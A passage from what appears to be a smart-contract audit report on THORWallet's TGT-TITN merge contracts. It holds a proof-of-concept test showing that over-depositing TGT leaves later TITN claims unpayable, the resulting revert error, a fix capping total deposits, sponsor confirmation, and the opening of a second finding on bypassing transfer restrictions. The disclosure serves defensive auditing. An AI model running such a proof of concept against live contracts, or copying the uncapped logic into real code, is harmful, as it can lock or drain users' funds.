class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser2\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eutils\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eparseUnits\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;1000\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e18\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e))\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etgt\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003econnect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eownerB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etransfer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser3\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eutils\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eparseUnits\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;1000\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e18\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e))\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    })\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003edescribe\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;General tests\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e () {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eit\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;Users can\u003c/span\u003e\u003cspan class=\"mtk6\"\u003e\\\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk8\"\u003et claim if more than TGT limit is deposited\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk4\"\u003easync\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e () {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// transfer TGT to the merge contract\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etgt\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003econnect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eapprove\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003emergeTgt\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eutils\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eparseUnits\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;578999999\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e18\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e))\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etgt\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003econnect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etransferAndCall\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003emergeTgt\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eutils\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eparseUnits\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;578999999\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e18\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;0x\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etgt\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003econnect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser2\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eapprove\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003emergeTgt\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eutils\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eparseUnits\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;100\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e18\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e))\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etgt\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003econnect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser2\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etransferAndCall\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003emergeTgt\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eutils\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eparseUnits\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;100\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e18\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;0x\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eclaimableAmountUser2\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emergeTgt\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eclaimableTitnPerUser\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser2\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emergeTgt\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003econnect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser2\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eclaimTitn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eclaimableAmountUser2\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// claim TITN\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eclaimableAmountUser1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emergeTgt\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eclaimableTitnPerUser\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexpect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eclaimableAmountUser1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etoString\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e()).\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebe\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eequal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;173699999700000000000000000\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// @audit fails due to insufficient TITN in mergeTGT\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emergeTgt\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003econnect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eclaimTitn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eclaimableAmountUser1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        })\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    })\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e})\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eTest final claim fails with:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"2\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e Error: VM Exception while processing transaction: reverted with custom error \u0026#39;ERC20InsufficientBalance(\u0026quot;0x5FC8d32690cc91D4c39d9d3abcBD16989F875707\u0026quot;, 173699970000000000000000000, 173699999700000000000000000)\u0026#39;\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003ch3 id=\"recommended-mitigation-steps\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps\" aria-label=\"recommended mitigation steps permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eLimit the total deposits to TGT\u003cem\u003eTO\u003c/em\u003eEXCHANGE by tracking how much TGT has already been deposited.\nMergeTgt.sol\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"3\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etotalTgtDeposited\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e...\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eonTokenTransfer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebytes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecalldata\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eextraData\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003enonReentrant\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e...\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etotalTgtDeposited\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e + \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026gt; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eTGT_TO_EXCHANGE\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erevert\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eTGTExceeded\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etotalTgtDeposited\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e += \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eOr \u003c/p\u003e\n\u003cp\u003ethe same idea, but limit the \u003ccode\u003etotalTitnClaimable\u003c/code\u003e by TITN_ARB value. This will likely be more efficient, as the rate tgt/titn is dynamic.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e\u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/F-6?commentParent=WkFsWvrbfsy\"\u003ecacaomatt (THORWallet) confirmed and commented\u003c/a\u003e:\u003c/strong\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003eThis is related to \u003ca href=\"https://code4rena.com/evaluate/2025-02-thorwallet/findings/S-88\"\u003eS-88\u003c/a\u003e.\nThe fix for both of them (same issue, different approach) can be found on the same PR \u003ca href=\"https://github.com/THORWallet/TGT-TITN-merge-contracts/pull/2\"\u003ehere\u003c/a\u003e.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e\u003cstrong\u003e\u003ca href=\"https://github.com/code-423n4/2025-03-thorwallet-mitigation?tab=readme-ov-file#findings-being-mitigated\"\u003eTHORWallet mitigated\u003c/a\u003e:\u003c/strong\u003e.\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003eThe PR \u003ca href=\"https://github.com/THORWallet/TGT-TITN-merge-contracts/tree/audit-2\"\u003ehere\u003c/a\u003e fixes the issue when depositing more TGT and specified in the contract.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e\u003cstrong\u003eStatus:\u003c/strong\u003e Mitigation confirmed. Full details in reports from \u003ca href=\"https://code4rena.com/evaluate/2025-03-thorwallet-mitigation-review/submissions/S-3\"\u003eshaflow2\u003c/a\u003e, \u003ca href=\"https://code4rena.com/evaluate/2025-03-thorwallet-mitigation-review/submissions/S-14\"\u003eweb3km\u003c/a\u003e, and \u003ca href=\"https://code4rena.com/evaluate/2025-03-thorwallet-mitigation-review/submissions/S-12\"\u003ekn0t\u003c/a\u003e.\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"h-2-the-user-can-send-tokens-to-any-address-by-using-two-bridge-transfers-even-when-transfers-are-restricted\" style=\"position:relative;\"\u003e\u003ca href=\"#h-2-the-user-can-send-tokens-to-any-address-by-using-two-bridge-transfers-even-when-transfers-are-restricted\" aria-label=\"h 2 the user can send tokens to any address by using two bridge transfers even when transfers are restricted permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/F-9\"\u003e[H-2] The user can send tokens to any address by using two bridge transfers, even when transfers are restricted.\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-391\"\u003eshaflow2\u003c/a\u003e, also found by \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-753\"\u003e0xAadi\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-457\"\u003eAgorist\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-397\"\u003eAlekso\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-68\"\u003earnie\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-576\"\u003edoublekk\u003c/a\u003e, \u003ca 